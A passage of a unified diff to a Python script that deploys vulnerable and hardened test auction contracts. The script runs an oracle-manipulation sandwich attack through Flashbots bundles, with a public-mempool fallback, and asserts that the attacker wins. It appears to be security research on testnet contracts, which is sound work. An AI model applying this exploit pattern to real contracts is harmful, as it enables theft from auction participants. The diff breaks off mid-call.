@@ -1,27 +1,25 @@
 #!/usr/bin/env python3
 """
-auctionwithspot.py
+auctionwithspot_native_eth.py
 Single orchestrator script to:
  - deploy auctions (via DeployWithSpots forge script)
- - distribute mock token to actors
- - perform commit / reveal flow with attacker sandwich via Flashbots (optional)
+ - perform commit / reveal flow with attacker sandwich (via Flashbots)
  - finalize auctions and run assertions
- - save run-record.json for analysis
+
+This version is **Native ETH ONLY** and has removed all ERC20 token logic.
 
 Environment variables (required):
  - RPC_URL
  - PRIVATE_KEY_DEPLOYER, PRIVATE_KEY_ALICE, PRIVATE_KEY_ATTACKER (hex private keys, 0x...)
  - FORGE_CMD (optional, default "forge")
- - MOCK_ERC20_ADDRESS (0x0 for ETH auctions)
  - PRICE_ORACLE_ADDRESS (mock with setPrice)
  - FLASHBOTS_ENABLED (true/false)
  - FLASHBOTS_SIGNER_PRIVKEY (if FLASHBOTS_ENABLED)
  - CHAIN_ID (optional, default 11155111)
- - AUCTION_MANAGER_ADDR (optional) - if you prefer manager to deploy auctions instead
 
 Run:
  source venv/Scripts/activate
- python auctionwithspot.py
+ python auctionwithspot_native_eth.py
 """
 
 import os, json, time, subprocess
@@ -29,7 +27,6 @@ from dotenv import load_dotenv
 from web3 import Web3, HTTPProvider
 from web3.middleware import geth_poa_middleware
 from eth_account import Account
-from hexbytes import HexBytes
 from flashbot_helper import FlashbotHelper
 from pathlib import Path
 
@@ -46,10 +43,7 @@ PRIVATE_KEY_DEPLOYER = os.environ["PRIVATE_KEY_DEPLOYER"]
 PRIVATE_KEY_ALICE = os.environ["PRIVATE_KEY_ALICE"]
 PRIVATE_KEY_ATTACKER = os.environ["PRIVATE_KEY_ATTACKER"]
 
-MOCK_ERC20 = os.environ.get("MOCK_ERC20_ADDRESS", "0x0000000000000000000000000000000000000000")
 PRICE_ORACLE_ADDR = os.environ.get("PRICE_ORACLE_ADDRESS", "")
-AUCTION_MANAGER_ADDR = os.environ.get("AUCTION_MANAGER_ADDR", "")
-
 FLASHBOTS_ENABLED = os.environ.get("FLASHBOTS_ENABLED", "false").lower() in ("1","true","yes")
 FLASHBOTS_SIGNER = os.environ.get("FLASHBOTS_SIGNER_PRIVKEY", None)
 FLASHBOTS_RELAY = os.environ.get("FLASHBOTS_RELAY", "https://relay-sepolia.flashbots.net")
@@ -62,22 +56,16 @@ PRICE_ORACLE_ABI = [
 ]
 
 
-ERC20_ABI = [
-    {"constant":False,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"mint","outputs":[],"type":"function"}, 
-    {"constant":True,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-    {"constant":False,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}, 
-    {"constant":True,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}, 
-    {"constant":False,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}, 
-    {"constant":False,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},
-    {"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}]
-
-
-
 # ----------------------
 # web3 + accounts
 # ----------------------
 w3 = Web3(HTTPProvider(RPC_URL))
 w3.middleware_onion.inject(geth_poa_middleware, layer=0)
+
+if not w3.is_connected():
+    raise SystemExit("Web3 connection failed. Check RPC_URL and network stability.")
+
+print(f"Connected to chain ID {w3.eth.chain_id} at block {w3.eth.block_number}")
 
 deployer = Account.from_key(PRIVATE_KEY_DEPLOYER)
 alice = Account.from_key(PRIVATE_KEY_ALICE)
@@ -136,62 +124,179 @@ def run_forge_script_and_extract_addresses(script_name="DeployWithSpot"):
                         hard_addr = c
             if vuln_addr and hard_addr:
                 break
-
     if not vuln_addr or not hard_addr:
         raise SystemExit("Could not parse deployed addresses from forge output or broadcast JSON")
 
     return Web3.to_checksum_address(vuln_addr), Web3.to_checksum_address(hard_addr)
 
+def get_eip1559_fees(priority_gwei=2, priority_gwei_override=None):
 
-def build_and_sign_tx(function_call, from_account, value=0, gas=None, nonce=None):
+    MAX_FEE_CAP_GWEI = 80 # Safe cap to prevent RPC error
+
+    """
+    Calculates EIP-1559 maxFeePerGas and maxPriorityFeePerGas.
+    We set a generous priority fee (bribe) to ensure inclusion for the Flashbots scenario.
+    """
+    # 2 Gwei base priority fee is standard for a good bribe
+    effective_priority_gwei = priority_gwei_override if priority_gwei_override is not None else priority_gwei
+    max_priority_fee = w3.to_wei(effective_priority_gwei, 'gwei')
+
+    try:
+        # Fetch the base fee from the latest block
+        latest_block = w3.eth.get_block('latest')
+        base_fee = latest_block.get('baseFeePerGas')
+
+        if base_fee is None:
+             # Fallback for non-EIP1559 chains or if field is missing (should not happen on Sepolia/Goerli)
+             print("Warning: baseFeePerGas missing. Falling back to legacy gasPrice.")
+             return w3.eth.gas_price, None, True
+
+        # Max Fee must cover the Base Fee + Max Priority Fee
+        # A common robust formula is: 2 * Base Fee + Max Priority Fee
+        max_fee = (2 * base_fee) + max_priority_fee
+        max_fee_cap = w3.to_wei(MAX_FEE_CAP_GWEI, 'gwei')
+        if max_fee > max_fee_cap:
+             print(f"Warning: Calculated maxFeePerGas ({w3.from_wei(max_fee, 'gwei'):.2f} Gwei) exceeded cap. Capping at {MAX_FEE_CAP_GWEI} Gwei.")
+             max_fee = max_fee_cap
+
+        return max_fee, max_priority_fee, False
+
+    except Exception as e:
+        print(f"Error fetching EIP-1559 fees ({e}). Falling back to legacy gasPrice.")
+        return w3.eth.gas_price, None, True
+
+
+def build_and_sign_tx(function_call, from_account, value=0, gas=None, nonce=None, priority_gwei_override=None):
+
     """
     Build, sign and return raw tx bytes (signed).
     function_call: Contract.function(...).buildTransaction(...) already prepared or function object + args passed in.
+    Includes EIP-1559 logic for online use with Flashbots.
     """
-    tx = function_call.build_transaction({
+    # Get the fee structure
+    max_fee, max_priority_fee, use_legacy = get_eip1559_fees(priority_gwei_override=priority_gwei_override)
+
+    tx_params = {
         "from": from_account.address,
         "nonce": w3.eth.get_transaction_count(from_account.address) if nonce is None else nonce,
-        "gasPrice": w3.eth.gas_price,
         "value": value,
         "chainId": CHAIN_ID
-    })
+    }
+    if use_legacy:
+        # Legacy transaction (if EIP-1559 fails or is not supported)
+        tx_params["gasPrice"] = max_fee # max_fee holds the gasPrice here
+    else:
+        # EIP-1559 transaction
+        tx_params["maxFeePerGas"] = max_fee
+        tx_params["maxPriorityFeePerGas"] = max_priority_fee
+
+    tx = function_call.build_transaction(tx_params)
+
     if gas:
         tx["gas"] = gas
-    # Estimate gas if missing
+     # Estimate gas if missing
+
     if "gas" not in tx:
         try:
             tx["gas"] = w3.eth.estimate_gas(tx)
-        except Exception:
-            tx["gas"] = 500_000
+        except Exception as e:
+            print(f"Gas estimation failed ({e}). Using fallback gas limit.")
+            tx["gas"] = 1_000_000
+
     signed = from_account.sign_transaction(tx)
     return signed
 
+
 def send_raw_and_wait(signed_tx):
-    if isinstance(signed_tx, (bytes, bytearray)):
-        tx_hash = w3.eth.send_raw_transaction(signed_tx)
-    else:
-        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
-        return w3.eth.wait_for_transaction_receipt(tx_hash)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    print(f"Transaction submitted: {tx_hash.hex()}")
+    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
 
-def distribute_token(erc20, to_address, amount, from_account=deployer):
-    tx = erc20.functions.transfer(to_address, amount).build_transaction({
-        "from": from_account.address,
-        "nonce": w3.eth.get_transaction_count(from_account.address),
-        "gasPrice": w3.eth.gas_price,
-        "chainId": CHAIN_ID
-    })
-    signed = from_account.sign_transaction(tx)
-    return send_raw_and_wait(signed)
+    if receipt['status'] == 0:
+        raise Exception(f"Transaction {tx_hash.hex()} REVERTED on-chain in block {receipt['blockNumber']}. Check logs/trace for details.")
+    return w3.eth.wait_for_transaction_receipt(tx_hash)
 
-def approve_if_token(token_contract, owner_account, spender, amount):
-    tx = token_contract.functions.approve(spender, amount).build_transaction({
-        "from": owner_account.address,
-        "nonce": w3.eth.get_transaction_count(owner_account.address),
-        "gasPrice": w3.eth.gas_price,
-        "chainId": CHAIN_ID
-    })
-    signed = owner_account.sign_transaction(tx)
-    return send_raw_and_wait(signed)
+
+def try_send_non_fatal(function_call, account, value, context_name, gas_limit=None, priority_gwei_override=None):
+    """
+    Helper to attempt a transaction, catch the error if it fails, and allow the script to continue.
+    Returns True if successful, False otherwise.
+    """
+    try:
+        # We must fetch the nonce fresh every time a public transaction is attempted
+        # because the Flashbots bundle attempt may have consumed nonces.
+        fresh_nonce = w3.eth.get_transaction_count(account.address)
+        signed_tx = build_and_sign_tx(function_call, account, value=value, nonce=fresh_nonce, gas=gas_limit)
+        send_raw_and_wait(signed_tx)
+        print(f"  ✅ SUCCESS: {context_name} mined.")
+        return True
+    except Exception as e:
+        import re
+        tx_match = re.search(r'Transaction (0x[0-9a-fA-F]{64}) REVERTED', str(e))
+        tx_hash = tx_match.group(1) if tx_match else 'unknown'
+        print(f"  ❌ FAILURE: {context_name} failed. Reason: Transaction {tx_hash} REVERTED on-chain. Details: {e}")
+        return False
+
+def try_flashbots_bundle(fb, bundle, max_iterations: int = 3, target_blocks: int = 3) -> bool:
+    """Submits a bundle aggressively for multiple blocks over multiple attempts."""
+    BLOCK_JUMP = 10
+
+
+
+    for iteration in range(1, max_iterations + 1):
+        current_block = w3.eth.block_number
+
+        start_index = BLOCK_JUMP
+        end_index = BLOCK_JUMP + target_blocks
+
+        target_blocks_list = [current_block + i for i in range(start_index, end_index)]
+        submissions = []
+
+        try:
+            print(f" [ATTEMPT {iteration}/{max_iterations}] Current block: {current_block}. Submitting bundle aggressively to blocks {target_blocks_list[0]} through {target_blocks_list[-1]}.")
+
+            # Submits the bundle to all blocks in the target_blocks_list
+            for target_block in target_blocks_list:
+                send_result = fb.send_bundle(bundle, target_block)
+                submissions.append(send_result)
+            print(f"   Bundle sent to Flashbots for blocks {target_blocks_list}")
+
+            # Wait for inclusion check
+            receipts = submissions[-1].wait()
+
+            if receipts is not None:
+                # Check if any transaction in the bundle was included
+                print(f" SUCCESS: Bundle included in block {receipts[0].blockNumber}!")
+                return True
+
+            else:
+                # The send was successful, but the bundle wasn't included in the targeted blocks
+                print(" FAILURE: Bundle sent but was not included in the target block window.")
+
+        except Exception as e:
+            # Handle submission failure (e.g., relay down, signature error)
+            print(f" ERROR: Flashbots submission failed: {e}")
+
+        # Wait for approximately one block time before retrying
+        time.sleep(12)
+        current_block = w3.eth.block_number # Update current block before next iteration
+
+    print(f" ❌ FINAL FAILURE: Bundle not included after {max_iterations} iterations.")
+    return False
+
+def check_exploit_success(auction_contract, expected_winner):
+    """
+    Checks the final state of the auction contract.
+    """
+    # This is a placeholder and should be implemented in your full script
+    try:
+        final_winner = auction_contract.functions.winner().call()
+        if final_winner == expected_winner:
+            print(f"  ✅ ASSERTION PASS: Final winner is {final_winner} (Expected Attacker)")
+        else:
+            print(f"  ❌ ASSERTION FAIL: Final winner is {final_winner} (Expected Attacker {expected_winner})")
+    except Exception as e:
+        print(f"  ❌ ASSERTION FAIL: Could not call winner() on contract. Error: {e}")
 
 
 # ----------------------
@@ -211,309 +316,361 @@ def main():
     hard = w3.eth.contract(address=hard_addr, abi=hard_abi)
     print("Vuln contract functions:", [fn.fn_name for fn in vuln.all_functions()])
 
-    ORACLE_ADDR = "0xE6429C6e938684ed6B9Dd950481ed7282EB94b9D"
-    ORACLE_ABI = [
-        {"inputs":[{"internalType":"uint256","name":"_price","type":"uint256"}],"name":"setPrice","outputs":[],"stateMutability":"nonpayable","type":"function"},
-        {"inputs":[],"name":"getPrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
-    ]
+    if not PRICE_ORACLE_ADDR:
+        raise SystemExit("PRICE_ORACLE_ADDRESS environment variable must be set for this script.")
 
-    # create a contract instance for the oracle (use checksum address)
-    price_oracle = w3.eth.contract(address=Web3.to_checksum_address(ORACLE_ADDR), abi=ORACLE_ABI)
-    print("Connected to PriceOracleMock at", ORACLE_ADDR, "current price:", price_oracle.functions.getPrice().call())
+    price_oracle = w3.eth.contract(address=Web3.to_checksum_address(PRICE_ORACLE_ADDR), abi=PRICE_ORACLE_ABI)
+    print("Connected to PriceOracleMock at", PRICE_ORACLE_ADDR, "current price:", price_oracle.functions.getPrice().call())
 
 
-    # 2) Optional: distribute mock token (if token-mode)
-    is_token = (MOCK_ERC20 != "0x0000000000000000000000000000000000000000")
-    erc20 = None
-    if is_token:
-        erc20 = w3.eth.contract(address=MOCK_ERC20, abi=ERC20_ABI)
-        amount = w3.to_wei(10, "ether")
-        print("Distributing token to Alice and Attacker...")
-        distribute_token(erc20, alice.address, amount)
-        distribute_token(erc20, attacker.address, amount)
+    # --- Configuration of Bids ---
+    # Alice (Victim) has the highest legitimate nominal bid
+    ALICE_BID_AMOUNT = w3.to_wei(0.01, "ether")
+    ALICE_NONCE_SECRET = Web3.keccak(text="secret-nonce-alice") # deterministic for test - bytes32
 
-    # 3) Alice commit
-    print("Preparing Alice commit...")
-    bid_amount = w3.to_wei(3, "ether")  # change as desired
-    nonce = Web3.keccak(text="secret-nonce-1")  # deterministic for test - bytes32
-    commit_hash = Web3.solidity_keccak(["uint256","address","bytes32"], [bid_amount, alice.address, nonce])
-    deposit_amount = w3.to_wei(1, "ether")  # must match deployed contract's depositAmount
-    
-    # If token auction: approve auction contract to pull deposit from Alice
-    if is_token:
-        print("Alice approve deposit to vuln auction")
-        approve_if_token(erc20, alice, vuln_addr, bid_amount + deposit_amount)
-        print("Alice approve deposit to hardened auction")
-        approve_if_token(erc20, alice, hard_addr, bid_amount + deposit_amount)
-     # --- Debug: print allowance after approval ---
-        alice_allowance_vuln = erc20.functions.allowance(alice.address, vuln_addr).call()
-        alice_allowance_hard = erc20.functions.allowance(alice.address, hard_addr).call()
-        print(f"Alice allowance to vuln auction after approve: {alice_allowance_vuln}")
-        print(f"Alice allowance to hardened auction after approve: {alice_allowance_hard}")
+    # Attacker has a low nominal bid, designed to be inflated
+    ATTACKER_BID_AMOUNT = w3.to_wei(0.003, "ether") # VERY LOW nominal bid
+    ATTACKER_NONCE_SECRET = Web3.keccak(text="secret-nonce-attacker")
 
-    
-    # Commit to vulnerable auction
-    signed_commit_vuln = build_and_sign_tx(vuln.functions.commit(commit_hash), alice, value=deposit_amount if not is_token else 0)
-    print("Sending Alice commit to vulnerable auction...")
-    send_raw_and_wait(signed_commit_vuln)
-    print("Alice committed to vulnerable auction")
+    # Deposit must match deployed contract's depositAmount
+    deposit_amount = w3.to_wei(0.001, "ether")
 
-    # Commit to hardened auction as well (same process) - to compare later
-    if is_token:
-        # ensure approval already done
-        pass
-    signed_commit_hard = build_and_sign_tx(hard.functions.commit(commit_hash), alice, value=deposit_amount if not is_token else 0)
-    send_raw_and_wait(signed_commit_hard)
-    print("Alice committed to hardened auction")
-    print(f"Alice intended bid_amount: {bid_amount}")
 
-    # wait until we're in reveal phase (prefer polling blocks over sleep)
-    commit_end_block = vuln.functions.commitEndBlock().call()  # read commitEndBlock from contract
+    # 2a) Alice commit (Highest legitimate bid)
+    print("\n--- Alice (Victim) Commit ---")
+    alice_commit_hash = Web3.solidity_keccak(["uint256","address","bytes32"], [ALICE_BID_AMOUNT, alice.address, ALICE_NONCE_SECRET])
+
+    signed_commit_vuln_alice = build_and_sign_tx(vuln.functions.commit(alice_commit_hash), alice, value=deposit_amount)
+    print(f"Sending Alice commit ({w3.from_wei(ALICE_BID_AMOUNT, 'ether')} ETH) to vulnerable auction...")
+    send_raw_and_wait(signed_commit_vuln_alice)
+
+    signed_commit_hard_alice = build_and_sign_tx(hard.functions.commit(alice_commit_hash), alice, value=deposit_amount)
+    send_raw_and_wait(signed_commit_hard_alice)
+    print("Alice committed to both auctions.")
+
+
+    # 2b) Attacker commit (Lowest nominal bid)
+    print("\n--- Attacker Commit ---")
+    attacker_commit_hash = Web3.solidity_keccak(["uint256","address","bytes32"], [ATTACKER_BID_AMOUNT, attacker.address, ATTACKER_NONCE_SECRET])
+
+    signed_commit_vuln_attacker = build_and_sign_tx(vuln.functions.commit(attacker_commit_hash), attacker, value=deposit_amount)
+    print(f"Sending Attacker commit ({w3.from_wei(ATTACKER_BID_AMOUNT, 'ether')} ETH) to vulnerable auction...")
+    send_raw_and_wait(signed_commit_vuln_attacker)
+
+    signed_commit_hard_attacker = build_and_sign_tx(hard.functions.commit(attacker_commit_hash), attacker, value=deposit_amount)
+    send_raw_and_wait(signed_commit_hard_attacker)
+    print("Attacker committed to both auctions.")
+
+
+    # Wait until we're in reveal phase
+    commit_end_block = vuln.functions.commitEndBlock().call() # read commitEndBlock from contract
     print("commitEndBlock =", commit_end_block)
 
-    print("Waiting for block > commitEndBlock (reveal phase)...")
+    print("\nWaiting for block > commitEndBlock (reveal phase)...")
     while True:
         current = w3.eth.block_number
         if current > commit_end_block + 1:
             print("Now in reveal phase at block", current)
             break
-        # sleep small amount to avoid tight loop; block times ~12s on Sepolia typically
         time.sleep(12)
 
-    print("Alice commit on hard:", hard.functions.commitments(alice.address).call())
-    print("Alice commit on vuln:", vuln.functions.commitments(alice.address).call())
+    # sanity: verify commits stored
+    assert vuln.functions.commitments(alice.address).call() != b'\x00'*32, "alice commitment missing (unexpected)"
+    assert vuln.functions.commitments(attacker.address).call() != b'\x00'*32, "attacker commitment missing (unexpected)"
 
 
-    # sanity: verify commit stored before revealing
-    comm_check = vuln.functions.commitments(alice.address).call()
-    assert comm_check != b'\x00'*32, "alice commitment missing (unexpected)"
+    # 3)---------- Sandwich: build front, ATTACKER REVEAL, back (single unified block) ----------
+    print("\n--- Starting Sandwich Attack on Vulnerable Auction ---")
+    # We must define these variables so the sequential fallback can access them later.
+    front_run_fn = None
+    attacker_reveal_vuln_fn = vuln.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET)
+    attacker_reveal_hard_fn = hard.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET)
+    back_run_fn = None
 
-    # if using token mode, ensure allowance >= bid_amount
-    if is_token:
-        print(f"Alice allowance before reveal: {alice_allowance_vuln}, bid_amount: {bid_amount}")
-        print(f"Alice allowance to hardened auction before reveal: {alice_allowance_hard}, bid_amount: {bid_amount}")
-        assert alice_allowance_vuln >= bid_amount, "alice token allowance insufficient for reveal"
-        assert alice_allowance_hard >= bid_amount, "alice token allowance insufficient for hardened reveal"
 
-    # 4)---------- Sandwich: build front, reveal, back (single unified block) ----------
-    # Build values
-    PHIGH = w3.to_wei(4000, "ether") if price_oracle else None
-    P0 = price_oracle.functions.getPrice().call() if price_oracle else None
+    # Attacker manipulates the price (4x the original/stable price)
+    P_STABLE = price_oracle.functions.getPrice().call() if price_oracle else None
+    P_HIGH = w3.to_wei(0.04, "ether") # Artificially high price
+
     if price_oracle:
-        print("Current oracle price:", P0)
+        front_run_fn = price_oracle.functions.setPrice(P_HIGH)
+        back_run_fn = price_oracle.functions.setPrice(P_STABLE)
+        print(f"Stable oracle price: {w3.from_wei(P_STABLE, 'ether')} ETH. Inflated price: {w3.from_wei(P_HIGH, 'ether')} ETH.")
 
     # Prepare nonces: explicit attacker nonces for deterministic ordering
     att_nonce = w3.eth.get_transaction_count(attacker.address)
-    alice_nonce = w3.eth.get_transaction_count(alice.address)
 
-    # Build & sign transactions (specify nonces where needed)
+    ATTACKER_GAS_LIMIT = 2_000_000
+    # Increase the priority fee significantly for the sandwich bundle to encourage inclusion
+    SANDWICH_PRIORITY_GWEI = 5
+
+    # 3a. Attacker front-run: set Price to P_HIGH (nonce = att_nonce)
     front_signed = None
+    if front_run_fn:
+        front_signed = build_and_sign_tx(front_run_fn, attacker, nonce=att_nonce, priority_gwei_override=SANDWICH_PRIORITY_GWEI)
+        att_nonce += 1 # Increment nonce for the next transaction
+
+    # 3b. Attacker reveal: exploit the high price (nonce = att_nonce + 1)
+
+    attacker_reveal_signed = build_and_sign_tx(
+        attacker_reveal_vuln_fn,
+        attacker,
+        value=ATTACKER_BID_AMOUNT,
+        nonce=att_nonce,
+        gas=ATTACKER_GAS_LIMIT,
+        priority_gwei_override=SANDWICH_PRIORITY_GWEI
+    )
+    print(f"Attacker's effective bid will be calculated using nominal bid {w3.from_wei(ATTACKER_BID_AMOUNT, 'ether')} * inflated price {w3.from_wei(P_HIGH, 'ether')}")
+    att_nonce += 1 # Increment nonce for the next transaction
+
+    # 3c. Attacker reveal: HARDENED auction (nonce = att_nonce)
+    attacker_reveal_hard_signed = build_and_sign_tx(
+        attacker_reveal_hard_fn,
+        attacker,
+        value=ATTACKER_BID_AMOUNT,
+        nonce=att_nonce,
+        gas=ATTACKER_GAS_LIMIT,
+        priority_gwei_override=SANDWICH_PRIORITY_GWEI
+    )
+    print(f"Attacker reveal HARDENED (Nonce {att_nonce}): should REVERT due to price check.")
+    att_nonce += 1 # Increment nonce for the next transaction
+
+    # 3d. Attacker back-run: reset Price to P_STABLE (nonce = att_nonce + 2)
     back_signed = None
+    if back_run_fn:
+        back_signed = build_and_sign_tx(back_run_fn, attacker, nonce=att_nonce, priority_gwei_override=SANDWICH_PRIORITY_GWEI)
 
-    if price_oracle:
-        # attacker front-run: use nonce = att_nonce
-        front_signed = build_and_sign_tx(price_oracle.functions.setPrice(PHIGH), attacker, nonce=att_nonce)
-        # attacker back-run (prepared now, nonce = att_nonce + 1)
-        back_signed = build_and_sign_tx(price_oracle.functions.setPrice(P0), attacker, nonce=att_nonce + 1)
-
-
-    # victim reveal (alice) — use her current nonce (separate for clarity)
-    reveal_signed = build_and_sign_tx(vuln.functions.reveal(bid_amount, nonce), alice, value=(0 if is_token else bid_amount), nonce=alice_nonce)
-
-    # 5) Send bundle via Flashbots or broadcast sequentially
-
-    print("Submitting sandwich...")
-
-    # Build bund list using raw signed tx bytes (no .hex())
+    # 4a) Send bundle via Flashbots
     bundle = []
     if front_signed:
-        bundle.append(front_signed.rawTransaction)   # bytes
-    bundle.append(reveal_signed.rawTransaction)
+        bundle.append(front_signed.rawTransaction)
+    bundle.append(attacker_reveal_signed.rawTransaction)
+    bundle.append(attacker_reveal_hard_signed.rawTransaction)
     if back_signed:
         bundle.append(back_signed.rawTransaction)
 
-    # Helper: try sending bundle for a few target blocks (polite retry)
-    def try_flashbots_bundle(bundle_bytes_list, attempt_blocks=3, offset=1):
-    # attempt_blocks: how many successive blocks to try (0 -> only once)
-        for i in range(attempt_blocks):
-            target_block = w3.eth.block_number + offset + i
-            try:
-            # If your FlashbotHelper.send_bundle supports target_block_offset or target_block_number,
-            # adapt the signature. Below we try to pass target_block_number for clarity.
-                print(f"  Sending bundle to Flashbots for target block {target_block} (attempt {i+1}/{attempt_blocks})")
-                res = fb.send_bundle(*bundle, target_block_offset=1)
-            # If send_bundle returns an object exposing wait() or get results, call it
-            # Many flashbots helpers return an object you must wait on; handle both.
-                try:
-                    receipt = res.wait()   # blocking — returns inclusion info if included
-                    if receipt:
-                        print(f"  Bundle included in block {receipt.blockNumber}")
-                        return True
-                except Exception:
-                # some libraries don't implement .wait(); fallback to simple log
-                    print("  Flashbots send returned; inclusion unknown (no .wait()).")
-                # you can check chain or logs later if desired
-                    return True
-            except Exception as e:
-                print("  Flashbots send failed:", e)
-            # continue and retry next target block
-                continue
-        return False
-
     bundle_included = False
     if FLASHBOTS_ENABLED and fb:
-    # Try the bundle for up to 3 target blocks (adjust as you like)
-        bundle_included = try_flashbots_bundle(bundle, attempt_blocks=3, offset=1)
+        bundle_included = try_flashbots_bundle(fb, bundle, max_iterations=1, target_blocks=10)
         if bundle_included:
-            print("Bundle submitted via Flashbots and (likely) included.")
-        else:
-            print("Bundle sent but not included in target blocks (or send failed).")
+            print("\n**Bundle submitted via Flashbots and included. Attacker attempted to win both auctions.**")
+            print("The Vulnerable auction should be won by the Attacker. The Hardened auction reveal should have reverted.")
 
-     # If bundle not included: if we are still in reveal phase, we must re-sign a fresh public reveal
-    alice_revealed_amount = vuln.functions.revealedBid(alice.address).call()
-    current_block = w3.eth.block_number
-    reveal_end_block = vuln.functions.revealEndBlock().call()
-    print(f"Current block: {current_block} revealEndBlock: {reveal_end_block}")
+        else:
+            print("Bundle sent but not included in target blocks (or send failed). Proceeding with public Alice reveal.")
+
+    # 4b) SEQUENTIAL BROADCAST FALLBACK (High-Risk Public Mempool Strategy) 
+    if not bundle_included:
+        print("\n!!! FALLBACK TRIGGERED: Atomic Bundle Failed. Switching to High-Risk Sequential Broadcast !!!")
+        print("Note: This is vulnerable to arbitrage bots stealing the profit, but provides a guaranteed broadcast.")
+        # --- Sequential Broadcast Execution using the robust try_send_non_fatal helper ---
+
+        # TX 1: Front-Run (Price Inflation)
+        try_send_non_fatal(
+            front_run_fn,
+            attacker,
+            value=0,
+            context_name="Sequential: 1/4 Price Inflation TX",
+            gas_limit=ATTACKER_GAS_LIMIT,
+            priority_gwei_override=SANDWICH_PRIORITY_GWEI
+        )
+
+        # TX 2: Attacker Reveal (Vulnerable) - Mirrors section 5 logic, but with high gas/priority
+        # This fixes the ContractLogicError and simplifies nonce management.
+        try_send_non_fatal(
+            attacker_reveal_vuln_fn,
+            attacker,
+            value=ATTACKER_BID_AMOUNT,
+            context_name="Sequential: 2/4 VULNERABLE Reveal TX",
+            gas_limit=ATTACKER_GAS_LIMIT,
+            priority_gwei_override=SANDWICH_PRIORITY_GWEI
+        )
+
+        # TX 3: Attacker Reveal (Hardened) - Expected to REVERT
+        try_send_non_fatal(
+            attacker_reveal_hard_fn,
+            attacker,
+            value=ATTACKER_BID_AMOUNT,
+            context_name="Sequential: 3/4 HARDENED Reveal TX (Expected Revert)",
+            gas_limit=ATTACKER_GAS_LIMIT,
+            priority_gwei_override=SANDWICH_PRIORITY_GWEI
+        )
+
+        # TX 4: Back-Run (Price Deflation)
+        if try_send_non_fatal(
+            back_run_fn,
+            attacker,
+            value=0,
+            context_name="Sequential: 4/4 Price Deflation TX",
+            gas_limit=ATTACKER_GAS_LIMIT,
+            priority_gwei_override=SANDWICH_PRIORITY_GWEI
+        ):
+             bundle_included = True # Mark as "successful" for final state check if the deflation worked
 
     if bundle_included:
-    # proceed normally — will check after reveal window
-        pass
+        print("\n*** EXPLOIT ATTEMPT COMPLETE ***")
+        # Check the VULNERABLE auction for success.
+        check_exploit_success(vuln, expected_winner=attacker.address)
     else:
-    # bundle not included. If still in reveal phase, broadcast public reveal (freshly signed)
-        if current_block <= reveal_end_block:
-            print("Bundle failed to include. Broadcasting Alice's reveal publicly *now* (still in reveal phase).")
-        # Get fresh nonce for Alice in case it changed
-            fresh_alice_nonce = w3.eth.get_transaction_count(alice.address)
-            try:
-                reveal_signed_pub = build_and_sign_tx(vuln.functions.reveal(bid_amount, nonce),
-                                                  alice,
-                                                  value=(0 if is_token else bid_amount),
-                                                  nonce=fresh_alice_nonce)
-            # send and wait
-                send_raw_and_wait(reveal_signed_pub)
-                print("Public reveal broadcasted and mined (or at least submitted).")
-            except Exception as e:
-            # If nonce error or RPC error: refresh nonce and retry once
-                print("Public reveal failed:", e)
-            # refresh nonce once more and retry if still in reveal phase
-                fresh_alice_nonce = w3.eth.get_transaction_count(alice.address)
-                try:
-                    reveal_signed_pub = build_and_sign_tx(vuln.functions.reveal(bid_amount, nonce),
-                                                      alice,
-                                                      value=(0 if is_token else bid_amount),
-                                                      nonce=fresh_alice_nonce)
-                    send_raw_and_wait(reveal_signed_pub)
-                    print("Public reveal retry succeeded.")
-                except Exception as e2:
-                    print("Public reveal retry failed:", e2)
+        print("\n*** ALL ATTEMPTS FAILED ***")
+        print("The attack failed to execute successfully in either atomic or sequential mode.")
+    
+
+    # 5a) Alice's Public Reveal (happens outside the sandwich)
+    print("\n--- Alice Public Reveal on Vulnerable Auction ---")
+    alice_revealed = vuln.functions.revealed(alice.address).call()
+    current_block = w3.eth.block_number
+    reveal_end_block = vuln.functions.revealEndBlock().call()
+
+    ALICE_GAS_LIMIT = 2_000_000
+
+    if not alice_revealed and current_block <= reveal_end_block:
+        print(f"Attempting Alice's public reveal (Current block: {current_block}, End block: {reveal_end_block})...")
+        try_send_non_fatal(
+            vuln.functions.reveal(ALICE_BID_AMOUNT, ALICE_NONCE_SECRET),
+            alice,
+            value=ALICE_BID_AMOUNT,
+            context_name="Alice's public reveal on VULNERABLE contract",
+            gas_limit=ALICE_GAS_LIMIT
+        )
+    elif alice_revealed:
+        print("Alice already revealed on VULNERABLE contract (state check confirmed).")
+    else:
+        print("Reveal window already passed; Alice cannot reveal publicly.")
+
+
+    # 5b) Attacker reveals on Hardened Auction (Normal Flow)
+    print("\n--- Attacker Reveal on Hardened Auction (Normal Flow) ---")
+    attacker_revealed_hard = hard.functions.revealed(attacker.address).call()
+    if not attacker_revealed_hard and current_block <= reveal_end_block:
+        try_send_non_fatal(
+            hard.functions.reveal(ATTACKER_BID_AMOUNT, ATTACKER_NONCE_SECRET),
+            attacker,
+            value=ATTACKER_BID_AMOUNT,
+            context_name="Attacker's reveal on HARDENED contract",
+            gas_limit=ALICE_GAS_LIMIT
+        )
+    elif attacker_revealed_hard:
+        print("Attacker already revealed on HARDENED contract.")
+
+
+    # 5c) Alice reveals on Hardened Auction
+    print("\n--- Alice Reveal on Hardened Auction (Normal Flow) ---")
+    alice_revealed_hard = hard.functions.revealed(alice.address).call()
+    if not alice_revealed_hard and current_block <= reveal_end_block:
+        try_send_non_fatal(
